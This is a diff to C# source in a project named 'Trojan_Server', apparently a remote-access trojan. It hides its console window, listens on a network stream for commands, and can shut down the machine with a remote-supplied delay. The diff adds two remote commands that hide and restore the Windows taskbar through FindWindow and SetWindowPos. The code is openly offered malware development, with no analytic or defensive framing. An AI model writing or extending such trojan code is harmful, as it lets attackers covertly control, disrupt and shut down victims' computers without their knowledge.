@@ -11,7 +11,27 @@ namespace Trojan_Server
 {
     class Program
     {
-public static NetworkStream Reciver;
+        private const int SWP_HIDEWINDOW = 0x80;
+        private const int SWP_SHOWWINDOW = 0x40;
+
+        [DllImport("user32.dll")]
+        public static extern bool SetWindowPos(
+        int hWnd,
+        int hWndInsertAfter,  
+        short X,  
+        short Y,
+        short cx,
+        short cy,
+        uint uFlags
+        );
+
+        [DllImport("user32.dll")]
+        public static extern int FindWindow(
+        string lpClassName,   
+        string lpWindowName    
+        );
+
+        public static NetworkStream Reciver;
         [DllImport("kernel32.dll")]
         public static extern bool FreeConsole();
         public static void Recive()
@@ -55,6 +75,16 @@ public static NetworkStream Reciver;
                             shutdown.StartInfo.Arguments = "-s -t " + ShutdownTime.Trim('\0');
                             shutdown.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                             shutdown.Start();
+                            break;
+                        case "HIDETASKBAR":
+                            int TaskBarHwnd;
+                            TaskBarHwnd = FindWindow("Shell_traywnd", "");
+                            SetWindowPos(TaskBarHwnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW);
+                            break;
+                        case "SHOWTASKBAR":
+                            int TaskBarHwnds;
+                            TaskBarHwnds = FindWindow("Shell_traywnd", "");
+                            SetWindowPos(TaskBarHwnds, 0, 0, 0, 0, 0, SWP_SHOWWINDOW);
                             break;
                     }
                 }
